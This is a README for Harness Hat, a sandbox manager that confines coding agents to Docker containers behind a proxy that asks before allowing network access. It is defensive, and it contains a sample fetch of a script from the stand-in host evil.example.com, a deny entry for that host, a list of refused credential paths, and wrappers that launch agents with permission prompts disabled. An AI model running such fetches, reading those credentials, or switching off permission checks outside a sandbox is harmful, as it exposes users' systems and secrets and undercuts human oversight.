# Harness Hat

> Docker-backed development sessions with proxy-mediated network policy — driven from a terminal UI.

Harness Hat (`hht`) is a session manager for running coding agents and dev workflows inside disposable, network-filtered Docker containers. You register a workspace, pick a language template, and get an interactive shell in a sandbox whose outbound traffic is steered through a policy-enforcing proxy governed by per-workspace allow/deny rules.

## Why

Modern coding agents (`claude`, `codex`, `antigravity`, `pi`, …) want to read your home directory, install random packages, hit unknown endpoints, and execute arbitrary shell. Giving them an unrestricted shell on your laptop is a bad time.

Harness Hat boxes each session in a container with:

- A real shell, real toolchains, your repo bind-mounted at `/workspace` by default.
- A scoped HTTP/CONNECT proxy that **prompts before allowing unknown hosts**, persists your decisions to `harness-rules.toml`, and refuses anything denied.
- **Strict-network mode**: `tun2proxy` + `iptables` capture *all* outbound TCP, so agents can't bypass the proxy by ignoring `HTTPS_PROXY`.
- Per-session seeded mounts for `~/.claude.json`-style files that agents rewrite in place, so two concurrent sessions can't corrupt each other.
- Container bootstrap for proxy routing, strict egress rules, localhost forwards, agent state mounts, and common coding-agent CLIs.

If an agent wants to `curl evil.example.com/install.sh`, it asks first. You see the request. You decide.

For a task-oriented walkthrough, see the [User Guide](<User Guide/README.md>).

## How it compares

Harness Hat overlaps with several development-environment, agent-sandbox, and container-workflow tools. This table focuses on the features that matter when you want an AI coding agent to work in a real repo without getting an unrestricted shell on your laptop.

| Feature | Harness Hat | [Dev Containers](https://containers.dev/) | [Codespaces](https://docs.github.com/en/codespaces/about-codespaces/what-are-codespaces) | [Coder](https://coder.com/docs) | [Daytona](https://www.daytona.io/docs/) | [E2B](https://e2b.dev/docs) | [Devbox](https://www.jetify.com/docs/devbox) |
|---------|-------------|----------------------------------------|--------------|-------|---------|-----|--------|
| Local-first | Yes, local Docker | Yes, or remote | Cloud | Self-hosted remote | Cloud/API | Cloud/API | Yes |
| Interactive dev shell | Yes | Yes | Yes | Yes | CLI/SSH/web | CLI/SDK | Yes |
| Runtime egress approvals | Yes | No | No | Admin/platform controls | Platform controls | Platform controls | No |
| Strict all-TCP egress capture | Yes | No | Platform-managed | Infrastructure-dependent | Sandbox networking | VM sandbox networking | No |
| Repo-local policy file | `harness-rules.toml` | Config, not policy | Dev container config | Template/config | Sandbox/template config | Template config | Config, not policy |
| Host-command approval gate | Yes, via `hostdo` | No | No | Not core | API/SDK model | API/SDK model | No |

## Requirements

- A macOS, Linux, or Windows 11 host with [Docker](https://docs.docker.com/get-docker/) and the `docker` CLI on your `PATH`. Windows support targets Docker Desktop with the WSL2 backend running Linux containers; Windows containers are not supported.
- A [Rust toolchain](https://www.rust-lang.org/tools/install), for `cargo install`.
- To use Claude Code setup-token authentication: Node.js 18+ and [Claude Code installed locally](https://docs.anthropic.com/en/docs/claude-code/getting-started).
- For strict-network mode: `/dev/net/tun` inside the Linux container. See [Container privileges](#container-privileges) for what this implies — it matters if your organization restricts privileged containers.

The [setup guide](<User Guide/01-setup.md>) includes platform-specific Docker links, verification commands, Linux permission setup, Rust installation, and local Claude Code setup.

## Quick start

```sh
cargo install harness-hat              # binary is `hht`
hht install                            # create the global config and start hht-daemon at login
hht                                    # attach to the background Harness Hat TUI
hht restart                            # reload daemon config and caches; sessions stay running
```

`hht` attaches to the installed `hht-daemon` when it is running. It displays the same Harness Hat TUI, backed by the daemon's live session, build, approval, and terminal state. When no daemon is running, `hht` retains its standalone manager behavior.

From inside the container, run `killme` to ask Harness Hat to stop the session.

With the manager running in another terminal, you can also attach to or start the session for your current directory:

```sh
hht workspace                          # match $PWD to a workspace, launch if needed, attach
hht wp ..                              # `workspace` shortcut; pass a command after it
hht workspace --template go         # skip the template picker, use a specific profile
hht workspace --name trust-service     # jump to a named workspace without cd-ing in
hht workspace --rebuild                # rebuild the image (--no-cache) before launching
hht workspace claude --resume          # runs "claude --resume" inside the session
```

When invoked from a subdirectory of a workspace, `hht workspace` enters that same relative directory in both an existing session and a newly launched one. This also works with a custom container mount target. With `--name`, a cwd outside the named workspace starts at that workspace's mount root.

`hht restart` is a soft daemon refresh: it validates and reloads the configured primary file, refreshes workspace/rules/proxy caches, and keeps running containers, PTYs, approvals, listeners, and the daemon token intact. It does not replace the executable or restart the background task; doing so would stop the PTY-owned `docker run --rm` sessions.

The first time you launch a workspace, `hht workspace` saves the chosen template in that workspace's `harness-rules.toml`. Every subsequent launch skips the picker and goes straight in. Pass `--template` to override it; an optional `template` value in the matching primary-config `[[workspaces]]` entry takes precedence over the workspace-local choice.

To attach to an already-running session from a separate terminal:

```sh
hht shell           # lists running sessions
hht shell <ID>      # attaches via `docker exec -it`
hht shell <ID> CMD  # runs CMD via docker exec
```

### VSCode-like editors (VS Code, Cursor, Windsurf, etc.)

You can attach VS Code, Windsurf, and other VS Code-based IDEs directly to a running Harness Hat container. The [VS Code-based editors guide](<User Guide/07-vscode-editors.md>) covers installation, attachment, Codex, and the correct workspace path.

## Model

```
 workspace  ─┐
             ├── session  ──>  one running container
 template   ─┘
```

- **Workspace** — a fixed host directory (your repo), mounted into the container at `/workspace`.
- **Template** — a `[container_profiles.<name>]` block referencing a Dockerfile stem under `docker_dir`, plus any compatible workspace-local `*.dockerfile` files. Sets memory, CPU, mounts, env, pre-approved hosts, and starter network allowlist.
- **Session** — one container, one shell, one network policy. Stop it from the TUI or by running `killme` inside it.

## Built-in templates

The base image is Ubuntu 24.04 with Node 22, bundled agent CLIs (`claude`, `codex`, `agy`, `pi`), and the shared proxy/control plumbing. Stacked on top:

On Windows, Codex auth, config, rules, skills, and plugins are copied into private container-local state at session startup. Its SQLite databases, logs, and caches stay inside the Linux container instead of being opened through Docker Desktop's Windows bind filesystem, which does not provide the locking semantics Codex requires. Host state is mounted read-only during this seed step.

| Stem         | Toolchain                                                                   |
|--------------|-----------------------------------------------------------------------------|
| `default`    | Node, pnpm, TypeScript, `tsx`, Bun                                          |
| `typescript` | TypeScript, Bun, npm, Node, pnpm, Vite, ESLint, Prettier                    |
| `go`         | Go, `gopls`, Delve, `staticcheck`, `golangci-lint`, `gofumpt`               |
| `rust`       | Rust stable + rustfmt, clippy, rust-analyzer, nextest, audit, deny          |
| `python`     | uv, Python 3.13 (via uv)                                                    |
| `kotlin`     | Temurin JDK 21, kotlinc, Gradle                                             |
| `csharp`     | .NET 10 SDK (LTS) + .NET 8 SDK                                              |
| `php`        | PHP CLI/dev, Composer, PHPUnit, PHP-CS-Fixer, PHPStan, Pint, Xdebug, PCOV  |

Drop your own `something.dockerfile` under `docker_dir` and reference it as `image = "something"`. Workspace-local `*.dockerfile` files are also auto-discovered as launch templates when their first non-comment instruction is `FROM harness-hat-base:local`.

Every template includes `rg` (ripgrep), `sg` / `ast-grep` for structural code search, and zsh with the Oh My Zsh git plugin. Use `attach_shell = "/bin/zsh"` in a container default or profile when `hht shell` and `hht workspace` attaches should open zsh instead of their default `/bin/bash`.

### SDK/runtime version management

Each template handles language version selection differently:

**Python (`python`)** — `uv` manages Python versions automatically. Set `requires-python = ">=3.11"` in `pyproject.toml` or add a `.python-version` file and `uv sync` / `uv run` will download and use the right Python without any extra steps. The image pre-installs Python 3.13 to seed the uv cache; other versions are fetched on demand.

**Go (`go`)** — `GOTOOLCHAIN=auto` is set in the image. If a module's `go.mod` specifies a newer toolchain than the one installed, Go downloads it automatically on first use.

**C# (`csharp`)** — Both .NET 10 (LTS, active until 2028) and .NET 8 (maintenance until 2026) SDKs are installed side-by-side. The `dotnet` CLI selects the right one via a [`global.json`](https://learn.microsoft.com/en-us/dotnet/core/tools/global-json) at the project root:
```json
{ "sdk": { "version": "8.0.400", "rollForward": "latestFeature" } }
```
If no `global.json` is present, the highest installed SDK (10) is used.

**Kotlin/JVM (`kotlin`)** — The system `kotlinc` is for one-off scripts. Real projects use Gradle, which downloads the Kotlin version specified in `build.gradle.kts` automatically. For JDK version selection, add the [Foojay toolchain resolver](https://github.com/gradle/foojay-toolchains) to `settings.gradle.kts`:
```kotlin
plugins {
    id("org.gradle.toolchains.foojay-resolver-convention") version "0.9.0"
}
```
Then Gradle will auto-download whichever JDK version your build requests via `java { toolchain { languageVersion = JavaLanguageVersion.of(17) } }`. Add `api.foojay.io` to the profile's `starter_network_allowlist` to allow the download.

### YOLO wrappers

The base image also ships `claude-yolo`, `codex-yolo`, and `agy-yolo` — thin wrappers that launch each agent with its own permission prompts disabled (`claude --dangerously-skip-permissions`, `codex --yolo`, `agy --dangerously-skip-permissions`). Running an agent like that on a bare host is exactly what Harness Hat exists to avoid; inside a session, the container boundary and the network policy are the guardrails instead, so the agent can work uninterrupted while the proxy still gates every outbound connection. Use them when you trust the sandbox, not the agent.

## Network policy

Each workspace can commit a `harness-rules.toml` next to its source. Harness Hat composes it with the global rules file at request time and persists any "Allow forever" / "Deny forever" approvals from the TUI back into it. An external change to either rules file immediately blocks new network and host-command decisions for the affected workspace until it is reviewed and explicitly trusted in a native system dialog; closing or failing to show that dialog stays blocked.

```toml
version = 1

[network]
allowlist = [
  "api.github.com",
  "registry.npmjs.org",
  "*.crates.io",
]
denylist = [
  "*.evil.example",
]
```

- **Deny wins** over allow.
- **Unknown** requests prompt in the TUI (Allow once / Deny once / Allow forever / Deny forever).
- Domain rules support exact (`example.com`) and subdomain-only wildcards (`*.example.com`).
- Hostnames are canonicalized (lowercase, trailing-dot strip, IDNA) before rule matching — case, trailing dots, and punycode can't bypass denies.
- HTTPS and other raw TCP destinations are policy-checked as `CONNECT` requests. Because TLS is not decrypted, HTTPS rules can only match the CONNECT host and port, not the inner HTTP method or path. Domain-only allow rules auto-allow HTTPS CONNECT on port 443; non-443 CONNECT needs an explicit `port=...` rule.

For hosts that should never prompt, use `[defaults.containers].allowed_hosts` or per-template `allowed_hosts` in `harness-hat.toml`. This pre-approves matching hosts without bypassing the proxy or strict-network routing. `allowed_hosts` supports exact hosts, `*`, and subdomain-only patterns such as `*.example.com`; list `example.com` separately when the apex should also be allowed.

## Strict-network mode

Enabled by default in the example config (`strict_network = true`). When on:

1. `tun2proxy` runs inside the container and captures **all** TCP via a TUN device.
2. `iptables` rejects every outbound packet that isn't loopback, Docker DNS, the scoped proxy, the control server, or an explicit `localhost_forwards` target.
3. UDP/QUIC are blocked (except DNS to Docker's embedded resolver).
4. IPv6 is rejected wholesale to prevent AAAA/QUIC hangs.

The result: an application that "doesn't honor `HTTPS_PROXY`" still gets its packets steered through the proxy or dropped.

### Container privileges

Strict mode changes how the container is started:

- **Linux**: the container starts with `--cap-drop ALL` and re-adds only `NET_ADMIN` (iptables + TUN setup), `SETUID`, and `SETGID` (the init's downward `gosu` drop to uid 1000), plus a `--device /dev/net/tun` passthrough — not full `--privileged`. If `/dev/net/tun` is missing on the host, the launch fails with an error instead of silently escalating.
- **macOS and Windows 11 (Docker Desktop)**: the container is started `--privileged`, because Docker Desktop exposes `/dev/net/tun` to Linux containers through that mode.

## Filesystem mounts

By default, every session mounts the workspace at `/workspace`. Add extra host paths with `[[defaults.containers.mounts]]` for every template, or `[[container_profiles.<name>.mounts]]` for one template. Mount changes apply when a new session container starts; restart an existing session to pick them up.

To mirror an absolute POSIX workspace path inside the Linux container instead, opt in through the global or project `harness-rules.toml`:

```toml
mirror_cwd = true
```

For example, `/home/user/my-project` is mounted at `/home/user/my-project` and becomes the container working directory. The effective source is the launch directory when `mount_cwd = true`, otherwise `canonical_path`. Native Windows paths cannot be represented exactly inside Linux containers, so Harness Hat keeps the configured mount target and logs that fallback.

```toml
[[defaults.containers.mounts]]
host = "~/src/shared-tools"
container = "/mnt/shared-tools"
mode = "ro"

[[container_profiles.typescript.mounts]]
host = "~/.cache/harness-hat/npm"
container = "/home/coder/.npm"
mode = "rw"
```

`host` supports `~` expansion. `container` is the path where the file or directory appears inside the session. `mode` is `rw` by default; use `ro` for reference material or credentials the container should read but not change. Missing host paths are skipped instead of being created by Docker.

For files that an agent rewrites in place, add `seed = true` to give each session a private copy:

```toml
[[defaults.containers.mounts]]
host = "~/.some-agent.json"
container = "/home/coder/.some-agent.json"
mode = "rw"
seed = true
```

Seeded mounts read the host file at launch, then write only to the session-local copy. This is the default for paths named `.claude.json`. If the same `container` path is configured in defaults and a profile, the profile mount wins.

Harness Hat refuses broad or sensitive host paths such as `/`, `$HOME`, `~/.ssh`, `~/.aws`, and `~/.kube`. Mount only the narrow file or directory the tool actually needs.

## Localhost port passthrough

Some tools need to reach a service already running on your laptop: a local model server, a dev database, a callback server, or an app backend. `localhost_forwards` exposes selected host-local TCP ports inside the container as `localhost:<container_port>` without opening general host networking. Forward changes apply when a new session container starts; restart an existing session to pick them up.

```toml
[[defaults.containers.localhost_forwards]]
container_port = 8081
host_port = 11434

[[container_profiles.typescript.localhost_forwards]]
container_port = 3000
```

With the first rule, a process in the container that connects to `http://localhost:8081` reaches port `11434` on the host. With the second, `host_port` is omitted, so `localhost:3000` in that template reaches host port `3000`.

Forwards can be set under `[defaults.containers]` for every template or under `[container_profiles.<name>]` for one template. A profile forward with the same `container_port` replaces the default forward for that port. Workspace-specific forwards can also be added to that workspace's `harness-rules.toml`:

```toml
[[localhost_forwards]]
container_port = 8081
host_port = 11434
```

Rules-file forwards are applied on top of the selected template, and a matching `container_port` replaces the configured forward. The same syntax in the global `harness-rules.toml` applies as a base to all workspaces. Start the host service before the container process tries to connect; Harness Hat forwards TCP traffic, but it does not start the host service for you.

In strict-network mode, configured forwards are added to the egress allowlist during container bootstrap. Other direct host or network destinations still go through the proxy policy or are blocked. This is not Docker `-p` publishing: it lets the container reach selected host services; it does not expose container ports back to the host or LAN.

## Security posture

The proxy and control plane are hardened against the usual proxy-abuse classes:

- Bearer-token and proxy-auth comparisons use constant-time equality.
- Scoped proxy listeners enforce per-source and total connection limits.
- Plain HTTP rejects missing, duplicate, or invalid `Host` headers.
- Forwarded HTTP strips hop-by-hop headers and every token named by `Connection:`.
- Destinations are resolved before connecting and restricted/private/link-local addresses are denied.
- DNS lookups are bounded, cached, and case-normalized.
- IPv6 SSRF predicate covers NAT64, 6to4, IPv4-translated, and discard-only prefixes.
- Audit log and `log_dir` are created `0o600`/`0o700` atomically and refuse to follow symlinks.
- The control server defaults to loopback-only, and the proxy exposes only authenticated per-session listeners; non-loopback binds require explicit `allow_remote_control = true`.
- Broad workspace/mount roots (`/`, `$HOME`, system directories) and common credential paths such as `~/.ssh`, `~/.aws`, and `~/.kube` are refused.
- Mount/container paths reject `:` and `,` to prevent `-v` argument injection.
- Externally modified rules files fail closed: new proxy and host-command decisions remain blocked until the reviewed current version is explicitly trusted in the system dialog.

### Threat model — what Harness Hat does not protect against

Harness Hat narrows what an agent can reach; it does not make a malicious agent safe. Know the boundaries:

- **TLS is not decrypted.** Policy sees only the CONNECT host and port. Allowing a host allows everything that host serves — an agent allowed to reach `github.com` can push data to any repository it can authenticate to.
- **Passed-through secrets are readable.** Anything in `env_passthrough` (e.g. `ANTHROPIC_API_KEY`) is visible to every process in the session, including the agent.
- **Your repo is writable.** The workspace path is a read-write bind mount. Agents can edit source, configs, and git hooks — review diffs before running the result on the host.
- **Container isolation is Docker's.** A kernel or runtime escape is outside Harness Hat's control, and strict mode on macOS starts the container privileged (see [Container privileges](#container-privileges)).

## Configuration overview

```toml
version = 1
docker_dir = "~/.config/harness-hat/docker"

[manager]
global_rules_file = "~/.config/harness-hat/harness-rules.toml"

[defaults.control]                       # killme + session identity
server_port = 7878
server_host = "127.0.0.1"
token_env_var = "HARNESS_HAT_TOKEN"

[defaults.proxy]
proxy_host = "127.0.0.1"
strict_network = true

[defaults.containers]
env_passthrough = ["TERM", "COLORTERM", "COLORFGBG", "ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"]
attach_shell = "/bin/zsh"              # default shell for hht shell/workspace attaches
claude_settings = "~/.claude/hht-settings.json" # private per-session settings.json copy
allowed_hosts = [
  "api.anthropic.com",
  "claude.ai",
  "*.openai.com",
  "github.com",
]

[[defaults.containers.mounts]]           # shared across all templates
host = "~/.claude.json"
container = "/home/coder/.claude.json"
mode = "rw"
seed = true                              # per-session copy, not a live bind

[[defaults.containers.mounts]]
host = "~/.claude/.claude.json"
container = "/home/coder/.claude/.claude.json"
mode = "rw"
seed = true

[[defaults.containers.localhost_forwards]]
container_port = 8081
host_port = 8081

[container_profiles.rust]
image = "rust"
memory = "6g"
cpus = "3"
shm_size = "1g"
starter_network_allowlist = [
  "domain=crates.io",
  "domain=*.crates.io",
  "domain=github.com",
]

[[workspaces]]
name = "my-project"
canonical_path = "~/src/my-project"
# Optional primary-config override. Otherwise the workspace remembers its
# selected template in ~/src/my-project/harness-rules.toml.
# template = "rust"
# Mount the invoking subdirectory as /workspace when launched through hht workspace.
# TUI launches continue to mount canonical_path.
mount_cwd = false
```

Full example: [`harness-hat.example.toml`](harness-hat.example.toml).

`attach_shell` is inherited from `[defaults.containers]` and can be overridden by a profile. `claude_settings` follows the same inheritance rules and seeds its source file as the session's private `~/.claude/settings.json`; session changes never modify the host source. Its path supports `~` expansion and must not be a broad or credential-bearing host path.

Set `mount_cwd = true` on a workspace to mount `hht workspace`'s invocation directory at `/workspace` instead of the configured workspace root. This is useful for a subdirectory in a larger workspace. The configured `canonical_path` continues to identify the workspace and locate its `harness-rules.toml` policy.

## Rolling out to a team

The pieces that matter once more than a handful of developers are involved:

- **Commit `harness-rules.toml` per repo.** Network approvals live next to the code and flow through normal review, so one developer's "Allow forever" becomes the team's rule instead of a private setting.
- **Manage the global rules file centrally.** Point `[manager].global_rules_file` at a path owned by your configuration management. Denies always win when rules compose, so a managed denylist — and `[hostdo] default_policy = "deny"`, if you want host execution off — cannot be overridden by a repo-local file.
- **Pre-approve the baseline.** Put your organization's package registries, VCS hosts, and agent API endpoints in `[defaults.containers].allowed_hosts` so day-one sessions don't drown developers in prompts.
- **Ship a shared `harness-hat.toml`.** Templates, mounts, and defaults live in one file; distribute it with your dotfiles or fleet tooling and developers only add their own `[[workspaces]]` entries.
- **Pin the version.** `cargo install harness-hat --version X.Y.Z` keeps the fleet on a known release and makes upgrades deliberate.

## Claude CLI authentication

Each container session runs Claude Code in a fresh environment. Harness Hat supports API-key auth, `claude setup-token` OAuth env auth, and on macOS can inject the local Claude Code Keychain access token into the seeded container session files.

For long-running sessions, prefer API-key auth or `CLAUDE_CODE_OAUTH_TOKEN`. macOS Keychain injection is a convenience fallback: Harness Hat copies the current access token, not the refresh token, so the container cannot refresh it after it expires.

**API key** (recommended for most setups):

1. Generate a key at [console.anthropic.com](https://console.anthropic.com) → API Keys.
2. Export it in your shell profile:
   ```bash
   export ANTHROPIC_API_KEY="sk-ant-api03-..."
   ```

**OAuth token** (alternative — stays tied to your Claude account):

1. Run once on the host to generate a long-lived token:
   ```bash
   claude setup-token
   ```
2. Export the printed value in your shell profile:
   ```bash
   export CLAUDE_CODE_OAUTH_TOKEN="<token>"
   ```
3. Remove the contents of the `oauthAccount` key inside `~/.claude.json`. Claude Code can prefer the stored account data over `CLAUDE_CODE_OAUTH_TOKEN` when that key is populated. Harness Hat strips this key from seeded container copies when env-token auth is active, but clearing the host file avoids stale state in older sessions and local Claude Code runs.

Either env var bypasses the interactive browser login flow, so new sessions start authenticated immediately. Run `/status` inside a session to confirm which method is active.

## Antigravity CLI authentication

Antigravity CLI (`agy`) stores settings and history under `~/.gemini/antigravity-cli`, but its login tokens live in the OS secure keyring. Harness Hat mounts `.gemini` for settings and starts a headless Linux Secret Service in each session, backed by `~/.local/share/harness-hat/container-keyrings` on the host.

The first `agy` login should be done inside a Harness Hat session. After that, new sessions reuse the persisted container keyring. A host desktop login is not copied by the `.gemini` mount alone.

## Host-side commands

Managed containers include `hostdo`, a small bridge for running approved host-side build, package, compiler, and test commands when the container is not the right execution environment.

```sh
hostdo output cargo test
hostdo output --reason "run targeted tests requested by user" cargo test
hostdo run cargo test
hostdo run --image node:20 npm test
hostdo list
hostdo tail <job-id> --rows 100
hostdo stop <job-id>
```

`hostdo output` waits for completion, prints captured stdout and stderr, and returns the underlying command's exit code. Use it when a command's result is needed immediately, for example `TOKEN=$(hostdo output az account get-access-token ...)`; use `hostdo run` when the job should remain independently inspectable or interactive.

`hostdo` is the one deliberate hole in the sandbox: approved commands execute **on the host** (or, with `--image`, in a separate host-side Docker container), outside the session's network policy. Treat every rule you add as a host-execution grant.

`hostdo` matching uses exact `argv + image`; optional `--reason` text is shown in approval UI and saved in `harness-rules.toml` for review context, but it does not gate matching. Timeout is also intentionally not part of matching.

Commands are checked against `[hostdo]` rules in the global and workspace `harness-rules.toml` files. Unknown commands prompt for approval, and remembered approvals are persisted as exact command rules. The `default_policy` key accepts `auto`, `prompt` (the default), or `deny` — and when the global and workspace files disagree, deny wins, so an organization can turn host execution off fleet-wide with `default_policy = "deny"` under `[hostdo]` in the managed global rules file.

Hostdo children never see harness-hat's own control-plane variables (`HARNESS_HAT_*` is always stripped). A rule can additionally set `env_allowlist = ["NAME", ...]` to run its command from a cleared environment containing only a small base set (`PATH`, `HOME`, locale, etc.) plus the listed variables, instead of inheriting the manager's full host environment.

## CLI

```
hht                       # attach to hht-daemon, or launch a local manager
hht init [PATH]           # write a starter config (default: ./harness-hat.toml)
hht workspace             # attach to or start a session for the current directory
hht workspace --list      # list configured workspaces
hht workspace [--name WORKSPACE] [--template NAME] [--rebuild] [COMMAND...]
hht rebuild [--no-cache] [TEMPLATE...] # rebuild base + selected/all templates
hht install                 # start the per-user background agent at graphical login
hht uninstall               # remove the per-user background agent
hht shell                 # list running sessions
hht shell <ID> [COMMAND...] # docker exec into a running session
hht shell --kill <ID>     # terminate and remove a running session
```

## Upgrading

```sh
cargo install harness-hat --force
```

Container images are built locally from the Dockerfiles under `docker_dir` and tagged `harness-hat-base:local`. After upgrading `hht` or changing a Dockerfile, rebuild the image from the TUI so new sessions pick up the changes — running sessions keep their existing image until restarted.

Use `hht rebuild` to rebuild the base image followed by every Dockerfile template in the configured `docker_dir`. Pass template stems to rebuild only selected images, for example `hht rebuild go python`; add `--no-cache` to bypass Docker's layer cache for both the base and template images. This command does not require the manager TUI to be running.

### Background agent

`hht install` creates the default global config at `~/.config/harness-hat/harness-hat.toml` when it is missing, then installs a per-user desktop agent using the `hht-daemon` process with launchd on macOS, a systemd user unit on Linux, or a Task Scheduler logon task on Windows. Run it as the signed-in desktop user, without `sudo`; it needs that user's Docker access and graphical session for approval dialogs. It starts the control server, scoped proxies, workspace-launch path, and native approval dialogs without requiring a terminal. A plain `hht` command attaches to the daemon's existing TUI instead of starting a competing manager. It is intentionally not a privileged system service. Use `hht uninstall` to stop and remove the agent.

When the agent is active, use `hht workspace` and `hht shell` for session work. Approval decisions are native system dialogs; if the desktop dialog backend is unavailable, requests remain denied rather than falling back to an invisible prompt.

## License

MIT — see [`LICENSE`](LICENSE).
